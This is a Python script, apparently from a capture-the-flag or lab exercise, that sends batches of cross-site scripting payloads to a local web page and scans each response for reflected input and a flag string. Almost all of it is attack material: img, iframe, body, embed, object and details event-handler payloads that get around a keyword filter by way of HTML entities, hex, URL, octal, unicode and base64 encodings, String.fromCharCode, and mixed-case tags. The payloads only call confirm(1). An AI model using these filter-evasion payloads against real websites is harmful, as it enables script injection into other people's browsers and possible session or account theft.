import requests
import urllib.parse
import re

target = "http://127.0.0.1:32808"
endpoint = "/page"

def send_payload(payload, test_name, print_response=False):
    """Send payload and check response"""
    data = {'name': payload}
    try:
        response = requests.post(target + endpoint, data=data, timeout=10)
    except:
        print(f"[!] Timeout on {test_name}")
        return None
    
    has_filter = "Sorry you can't use:" in response.text
    filter_match = re.search(r"Sorry you can't use: '([^']+)'", response.text)
    blocked_content = filter_match.group(1) if filter_match else None
    
    is_reflected = payload in response.text
    flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
    has_flag = len(flag_matches) > 0
    
    print(f"\n=== {test_name} ===")
    print(f"Payload: {payload[:100]}")
    print(f"Status: {response.status_code}")
    print(f"Filter: {has_filter}")
    if blocked_content:
        print(f"Blocked: '{blocked_content}'")
    print(f"Reflected: {is_reflected}")
    print(f"Flag: {flag_matches if has_flag else 'None'}")
    
    if print_response and (is_reflected or has_flag):
        print(f"Response snippet:\n{response.text[:500]}")
    
    return {
        'test_name': test_name,
        'payload': payload,
        'status_code': response.status_code,
        'has_filter': has_filter,
        'blocked_content': blocked_content,
        'is_reflected': is_reflected,
        'has_flag': has_flag,
        'flag_matches': flag_matches,
        'response_text': response.text if (is_reflected or has_flag) else None
    }

print("=" * 80)
print("EXTREME BYPASS - HTML ENTITIES FOR ENTIRE WORDS")
print("=" * 80)

results = []

# Create HTML entity encoded versions of entire blocked words
# "confirm" = c(99)o(111)n(110)f(102)i(105)r(114)m(109)
# "alert" = a(97)l(108)e(101)r(114)t(116)

entity_tests = [
    # HTML entity encode "confirm" as &#99;&#111;&#110;&#102;&#105;&#114;&#109;
    ("<img src=x onerror=eval('&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)')>", "HTML entity confirm"),
    
    # Hex entity encode
    ("<img src=x onerror=eval('&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;(1)')>", "Hex entity confirm"),
    
    # Mix of entities
    ("<img src=x onerror=Function('&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)')()>", "Function + entity"),
    
    # URL encode the entire function call
    ("<img src=x onerror=eval('%63%6f%6e%66%69%72%6d%28%31%29')>", "URL encoded confirm"),
]

for payload, name in entity_tests:
    result = send_payload(payload, name)
    if result:
        results.append(result)

print("\n" + "=" * 80)
print("USING ALLOWED-ONLY TAGS - bodY, iFrame, embed, object")
print("=" * 80)

# Test tags that have mostly allowed characters
allowed_tags_tests = [
    # bodY tag has 'a' - need to encode it
    ("<bodY onLoAd=eval('&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)')>", "bodY encoded"),
    
    # iFrame
    ("<iFrame src=x onError=eval('&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)')>", "iFrame encoded"),
    
    # embed
    ("<embed src=x onError=eval('&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)')>", "embed encoded"),
    
    # object
    ("<object data=x onError=eval('&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)')>", "object encoded"),
    
    # deTails
    ("<deTails oPen oNtoGgLe=eval('&#99;&#111;&#110;&#102;&#105;&#114;&#109;(1)')>", "deTails encoded"),
]

for payload, name in allowed_tags_tests:
    result = send_payload(payload, name)
    if result:
        results.append(result)

print("\n" + "=" * 80)
print("COMPLETE OBFUSCATION - NO BLOCKED CHARACTERS LITERAL")
print("=" * 80)

# Build payloads where blocked characters are completely encoded
obfuscation_tests = [
    # Use only entities for function name
    ("<img src=x onerror=eval(String.fromCharCode(99,111,110,102,105,114,109,40,49,41))>", "fromCharCode only"),
    
    # Base64 for "confirm(1)" - Y29uZmlybSgxKQ==
    ("<img src=x onerror=eval(atob('Y29uZmlybSgxKQ=='))>", "Base64 atob"),
    
    # Hex string
    ("<img src=x onerror=eval('\\x63\\x6f\\x6e\\x66\\x69\\x72\\x6d\\x28\\x31\\x29')>", "Hex escaped"),
    
    # Octal string
    ("<img src=x onerror=eval('\\\\143\\\\157\\\\156\\\\146\\\\151\\\\162\\\\155\\\\050\\\\061\\\\051')>", "Octal escaped"),
    
    # Unicode escape
    ("<img src=x onerror=eval('\\u0063\\u006f\\u006e\\u0066\\u0069\\u0072\\u006d\\u0028\\u0031\\u0029')>", "Unicode escaped"),
]

for payload, name in obfuscation_tests:
    result = send_payload(payload, name)
    if result:
        results.append(result)

